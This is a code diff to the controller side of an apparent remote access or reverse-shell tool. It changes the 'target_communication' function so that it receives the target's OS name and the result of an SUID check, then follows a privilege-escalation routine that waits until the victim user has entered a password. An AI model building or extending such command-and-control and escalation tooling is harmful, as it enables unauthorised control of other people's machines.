@@ -61,16 +61,21 @@ def target_communication():
             osname = reliable_recv()
             print(f"This is OS NAME:{osname}")
             if osname == 'posix':
-                print("Starting Escalation")
-                while True:
-                    check = reliable_recv()
-                    print(check)
-                    if check == "DONE":
-                        break
-                result = reliable_recv()
-                print(result)
+                SUID = reliable_recv()
+                print(f"Result from checking SUID: {SUID}")
+                if "Found" in SUID:
+                    print("Starting Escalation")
+                    while True:
+                        check = reliable_recv()
+                        print(check)
+                        if check == "USER has already input PASS":
+                            break
+                    result = reliable_recv()
+                    print(result)
+                else:
+                    print(reliable_recv())
             else:
-                print("Can't escalate B/C not posix system")
+                print("Escalation Failed B/C not posix system")
         elif command == "sudo su -l":
             print(command)
         else:
